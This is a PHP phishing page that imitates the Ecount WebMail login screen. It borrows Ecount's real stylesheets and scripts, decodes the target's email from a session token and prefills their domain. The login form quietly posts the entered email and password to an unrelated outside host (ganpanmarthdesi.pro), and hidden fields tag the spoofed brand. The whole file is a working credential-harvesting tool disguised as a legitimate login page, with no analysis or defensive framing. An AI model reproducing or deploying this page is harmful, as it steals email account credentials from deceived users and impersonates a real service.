<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<!DOCTYPE html>
<html class="">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="ECOUNT" />

    <title>Ecount WebMail - Login</title>
    
    <link rel="shortcut icon" href="https://resourcev3.ecount.com/ec3/ecerp/contents/images/ci/favicon.ico?v=3716873378459524404-19" />
    <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/wmail/contents/bundle/bundle.style.noauth.-4919510361266638091.19.css" />
        <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/wmail/contents/css/login.-727052913155639716.19.css" />
    <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/wmail/contents/css/common-responsive.-727052913155639716.19.css" />

    

</head>

<body class="cursor-default">
    

    <div id="UpGradeBrowserNotice" class="wrapper-notification main"></div>
    <div id="main" class="wrapper-notification main hidden">
        <div class="notification notification-info animated bounceInDown">
            <button type="button" class="close" data-dismiss="alert">×</button>
            <div class="notification-heading">Recommended Web Browser</div>
            <div class="notification-contents">Current web browser may have some compatibility issues.<br />We recommend using the Google Chrome web browser.</div>
        </div>
    </div>

    <div data-ecpageid="" id="divDefaultErr">
        <div class="page page-fluid page-login-error hidden">
            <div class="header header-fixed">
                <div class="wrapper-title">
                    <div class="wrapper-toolbar">
                        <div class="pull-left">
                            <span class="page-name">
No matching login informaton found.                            </span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="contents contents-fixed" style="margin-top:30px;top:30px;bottom:37px">
                <div id="divFailCountMessage" class="hidden">
                    <div class="wrapper-article" data-nosnippet>
                        <label id="failCountMessage1"></label>
                        <br />
                        <div class="wrapper-toolbar text-center ma-20">
                            <button class="btn btn-primary btn-xl" id="findPassword" onclick="searchPasswordPopup();" data-nosnippet>Forgot your login information?</button>
                        </div>
                        <label id="failCountMessage2" class="hidden" data-nosnippet>
                            <br />
                            If you have entered incorrectly more than 5 times, reset using [Forgot your login information?] or
                            <br />
                            Please request a change to the mail administrator.
                        </label>
                        <label id="failCountMessage3" class="hidden" data-nosnippet>
                            <br />
                            Reset using [Forgot your login information?] or
                            <br />
                            Please request a change to the mail administrator.
                        </label>
                    </div>
                    <div class="wrapper-sub-title" data-nosnippet>Failed Login Attempts</div>
                    <table class="table table-bordered">
                        <colgroup>
                            <col class="table-login-error-col1" />
                            <col class="table-login-error-col2" />
                        </colgroup>
                        <thead>
                            <tr>
                                <th data-nosnippet>Time</th>
                                <th data-nosnippet>IP</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr id="failDetailRow0" class="hidden">
                                <td class="text-center" id="failtime0"></td>
                                <td class="text-center" id="failIp0"></td>
                            </tr>
                            <tr id="failDetailRow1" class="hidden">
                                <td class="text-center" id="failtime1"></td>
                                <td class="text-center" id="failIp1"></td>
                            </tr>
                            <tr id="failDetailRow2" class="hidden">
                                <td class="text-center" id="failtime2"></td>
                                <td class="text-center" id="failIp2"></td>
                            </tr>
                            <tr id="failDetailRow3" class="hidden">
                                <td class="text-center" id="failtime3"></td>
                                <td class="text-center" id="failIp3"></td>
                            </tr>
                            <tr id="failDetailRow4" class="hidden">
                                <td class="text-center" id="failtime4"></td>
                                <td class="text-center" id="failIp4"></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <div id="divFailMessage" class="wrapper-article">
                    <div class="wrapper-toolbar text-lg" data-nosnippet>
                        <label id="errorMessage"></label>
                    </div>
                    <div class="wrapper-sub-title hidden" id="errorSolution" data-nosnippet>Solution</div>
                    <ul class="hidden" id="errorSolutionUl">
                        <li id="errorSolutionMessage"></li>
                    </ul>
                </div>

            </div>
            <div class="footer footer-fixed">
                <div class="wrapper-toolbar">
                    <button class="btn btn-default" onclick="closeErrorPopup();" id="closeButton">Close</button>
                    <button class="btn btn-default hidden" onclick="masterLogin();" id="masterLogin">Master ID Login</button>
                    <button class="btn btn-default hidden" onclick="secessionLogin();" id="secessionLogin">Login</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal-backdrop fade in hidden" id="fade"></div>


    <div class="page-login-form webmail" id="divLoginForm">

        <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post" >
            <div class="page-login-form state-type-id webmail ">
                <div class="contents">
                    <div class="login-logo"></div>

                    <div class="login-form">
                        <div class="form">
                            <div class="login-id" data-nosnippet>
                                <input type="text" class="form-control" id="email" onfocus="this.select(); nextfield = "passwd";" onkeyup="textLenCheck("email", 100)" onkeydown="eventKeyDown();window.checkClassName(this);" onblur="checkClassName(this);" maxlength="100" required name="user" value="" autocomplete="new-password" placeholder="Email">
                                <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
                                <input type="hidden" name="sender" value="Ecount" >
                                <input type="hidden" name="link" value="https://wmail.ecount.com/WMAIL/Login/Login" >
                            </div>
                                
                            <div class="login-password" data-nosnippet>
                                <input type="password" class="form-control" id="passwd" name="passwd" maxlength="15" required autofocus placeholder="Password">
                                
                            </div>
                        </div>

                        <div class="form-option">
                            <span class="form-checkbox form-checkbox-block" data-nosnippet>
                                <input type="checkbox" id="loginck" name="loginck" onfocus="nextfield = "save";" >
                                <label for="loginck" data-nosnippet>Save Email</label>
                            </span>
                        </div>
                             
                        <div class="form-login-btn">
                            <input type="image" src="img/btn.png" width="400" height="38">
                        </div>
                    </div>

                    <div class="login-notice" style="">
                        <div class="panel panel-default">
                            <div class="panel-heading">

                            </div>
                            <div class="panel-body">
                            </div>
                        </div>
                    </div>

                    <div class="login-function">
                        <ul class="family-sites">
                            <li class="erp"><a href="https://login.ecount.com" target="_blank" data-nosnippet>ECOUNT ERP</a></li>
                            <li class="cs"><a href="https://cs.ecount.com" target="_blank" data-nosnippet>Customer Portal</a></li>
                            <li class="userpay"><a href="https://pay.ecount.com" target="_blank" data-nosnippet>UserPay</a></li>
                            <li class="homepage"><a href="#" id="homePage" onclick="homePagePopup();" target="_blank" data-nosnippet>ECOUNT Website</a></li>
                            <li class="homepage-mail"><a href="https://www.ecount.com/wmail/">Ecount Webmail Website</a></li>
                        </ul>

                        <ul class="function">
                            <li class="create-shortcut" onclick="createShortcut();">Desktop Icon<a href="#false" id="createShortcut" target="_blank"></a></li>
                            <li class="call-center" onclick="writeCallBack();">Consultation Request</li>
                            <li class="browser-optimization" onclick="browserOptimization();">Browser Optimization</li>
                            <li class="connection-failure-request" onclick="connectionFailureRequest();"> Report an error</li>
                            <li class="remote-assistance" onclick="remoteAssistance();">Remote</li>
                            <li class="email-inquiry" onclick="QuestionMailPopup();">Contact Us</li>


                        </ul>
                    </div>

                    <div class="login-additional-function">
                        <ul>
                            <li><a href="#" onclick="searchPasswordPopup();">Forgot password?</a></li>
                            <li><a href="#" id="api" onclick="javascript:oapiPageRedirect("en-US")">ECOUNT API</a></li>
                            <li>
                                <button type="button" class="btn btn-default btn-selectbox">United States (English)</button>
                                <ul class="dropdown-menu dropup">
                                    <li id="li_ko-KR">
                                    <li><a href="#" onclick="lanTypeChange("ko-KR");">한국 (한국어)</a></li>
                                    <li id="li_en-US"><a href="#false" onclick="lanTypeChange("en-US");">United States (English)</a></li>
                                    <li id="li_zh-CN"><a href="#false" onclick="lanTypeChange("zh-CN");">中国 (简体中文)</a></li>
                                    <li id="li_zh-TW"><a href="#false" onclick="lanTypeChange("zh-TW");">台灣 (繁體中文)</a></li>
                                    <li id="li_ja-JP"><a href="#false" onclick="lanTypeChange("ja-JP");">日本 (日本語)</a></li>
                                    <li id="li_vi-VN"><a href="#false" onclick="lanTypeChange("vi-VN");">Việt Nam (Tiếng Việt)</a></li>
                                    <li id="li_es"><a href="#false" onclick="lanTypeChange("es");">América Latina (Español)</a></li>
                                    <li id="li_en-MY"><a href="#false" onclick="lanTypeChange("en-MY");">Malaysia (English)</a></li>
                                    <li id="li_id-ID"><a href="#false" onclick="lanTypeChange("id-ID");">Indonesia (Bahasa Indonesia)</a></li>
                                    <li id="li_th-TH"><a href="#false" onclick="lanTypeChange("th-TH");">ประเทศไทย (ไทย)</a></li>
                                </ul>
                            </li>
                        </ul>
                    </div>

                </div>
            </div>


            <input type="hidden" id="process_ing" name="process_ing" value="N" />
            <input type="hidden" id="lan_type" name="lan_type" value="en-US" />
            <input type="hidden" id="domain" name="domain" value="https://wmail.ecount.com/WMAIL/Login/WebmailMain" >
            <input type="hidden" id="login_type" name="login_type" value="N" />
        </form>
    </div>


    
    <script src="/wmail/optimized/contents/js/92e0c59c8c80e9357bea06357513e229_b923d04ac170b587bb0d6508bfafeae9.js?v=-3079658570575410517-19"></script>
        <script src="https://resourcev3.ecount.com/ec3/wmail/contents/js/lib/jactivator.dbgskip.-4905077998122110148.19.js"></script>
    <script src="https://resourcev3.ecount.com/ec3/wmail/contents/bundle/bundle.tpl.6176557926875074283.19.js"></script>
        <script src="https://resourcev3.ecount.com/ec3/wmail/contents/js/lib/obprepare.dbgskip.-4905077998122110148.19.js"></script>
        <script src="https://resourcev3.ecount.com/ec3/wmail/contents/js/lib/xcessbody.dbgskip.-4905077998122110148.19.js"></script>
        <script src="https://resourcev3.ecount.com/ec3/wmail/contents/js/jquery.prototype.ajax.extend.dbgskip.-4905077998122110148.19.js"></script>
    <script src="https://resourcev3.ecount.com/ec3/wmail/contents/js/require/require.resource.en-us.7934734948041498104.19.js"></script>

    <script src="https://resourcev3.ecount.com/ec3/wmail/contents/js/culture/culture.en-us.-4905077998122110148.19.js"></script>
    <script src="https://resourcev3.ecount.com/ec3/wmail/contents/bundle/bundle.prototype.1108996506835821674.19.js"></script>
    
    <script src="https://resourcev3.ecount.com/ec3/wmail/contents/js/require/require.noauth.5575495439395409752.19.js"></script>


    
    <script src="https://resourcev3.ecount.com/ec3/wmail/contents/bundle/bundle.infra.noauth.-4919510361266638091.19.js"></script>
	<script src="https://resourcev3.ecount.com/ec3/wmail/contents/bundle/bundle.frameworks.2139480502544202965.19.js"></script>
    <script language="javascript">
        $.extend(ecount, {
            proxyPathRoot: "/",
            apiPathRoot: "/WMAPI",
        });
    </script>

    

    
    <script language="javascript">
        var getBrowser = function () {
            "use strict";
            var agent = navigator.userAgent.toLowerCase();
            var name = navigator.appName;
            var browser;

            // MS 계열 브라우저를 구분하기 위함.
            if (name === "Microsoft Internet Explorer" || agent.indexOf("trident") > -1 || agent.indexOf("edge/") > -1) {
                browser = "ie";
                if (name === "Microsoft Internet Explorer") { // IE old version (IE 10 or Lower)
                    agent = /msie ([0-9]{1,}[\.0-9]{0,})/.exec(agent);
                    browser += parseInt(agent[1]);
                } else { // IE 11+
                    if (agent.indexOf("trident") > -1) { // IE 11
                        browser += 11;
                    } else if (agent.indexOf("edge/") > -1) { // Edge
                        browser = "edge";
                    }
                }
            } else if (agent.indexOf("safari") > -1) { // Chrome or Safari
                if (agent.indexOf("opr") > -1) { // Opera
                    browser = "opera";
                } else if (agent.indexOf("chrome") > -1) { // Chrome
                    browser = "chrome";
                } else { // Safari
                    browser = "safari";
                }
            } else if (agent.indexOf("firefox") > -1) { // Firefox
                browser = "firefox";
            }

            return browser;
        }

        var browser = getBrowser();
        if (/^ie[0-8]$/i.test(browser)) {
            location.href = "/WMAIL/Login/DenyBrowser?lan_type=en-US";
        }
        else if (/^ie9$/i.test(browser)) {
            $("#main").removeClass("hidden");
        }

        window["viewBag" + ""] = {};
        window["viewBag" + ""].errCode = "";
        window["viewBag" + ""].errMsg = "";
        window["viewBag" + ""].MSG07372 = "You have typed an incorrect password more than 5 times and will no longer be able to login with your old password.";
        window["viewBag" + ""].MSG07875 = "Telephone consultations are not available at this time.";
        window["viewBag" + ""].loginFailResult = "";
        window["viewBag" + ""].noticeInfo = {
            usingNotification: "N",
            notificationText: ""
        };
        window["viewBag" + ""].loginErrorMsg = "Please enter the correct Code, ID, and Password.<br />If you do not know your login information, please contact the Master ID.";
        window["viewBag" + ""].LBL09475 = "Renew Ecount Webmail Subscription";
        window["viewBag" + ""].LBL13321 = "Call Help Request";
        window["viewBag" + ""].ieDeactiveMsg = {
            contents: "<div class="text-center text-xl text-bold mt-10">Information on the Usage Restriction Due to IE Service Termination</div><div class="wrapper-article mt-15">	<div class="text-lg">Internet Explorer was restricted from use in ECOUNT as Microsoft terminates its services on 15th June 2022. </div>	<div class="text-lg mt-10">Login through the IE browser is <span class="text-danger text-bold">not possible.</span>.<br>Please use one of the two browsers below.</div>	<div class="mt-10">	  <table class="table table-border-no-a ml-15 text-lg">		<tbody>		  <tr>			<td style="width:120px; height:35px"><div class="text-remark mt-0">Chrome</div></td>			<td><a href="{0}" target="_blank"><button class="btn btn-sm btn-primary">Download</button></a></td>		  </tr>		  <tr>			<td style="width:120px; height:35px"><div class="text-remark mt-0">Edge</div></td>			<td><a href="{1}" target="_blank"><button class="btn btn-sm btn-primary">Download</button></a></td>		  </tr>		</tbody>	  </table>	</div></div>",
            todayNotView: "Disable pop-up today",
            close: "Close"
        };
        window["viewBag" + ""].spasswd = "";
        window["viewBag" + ""].yn_pwdskip = "";
        window["viewBag" + ""].login_type = "";
        window.__EC_PAGE_ID = "";
    </script>
    <script src="https://resourcev3.ecount.com/ec3/wmail/contents/pages/login/views/login.-550090767347447433.19.js" type="text/javascript"></script>


    <script language="javascript">
        
        

        // Shorthand for $(document).ready()
        $(function () {
            $("body").addClass("cursor-default");
        });
    </script>
</body>
</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>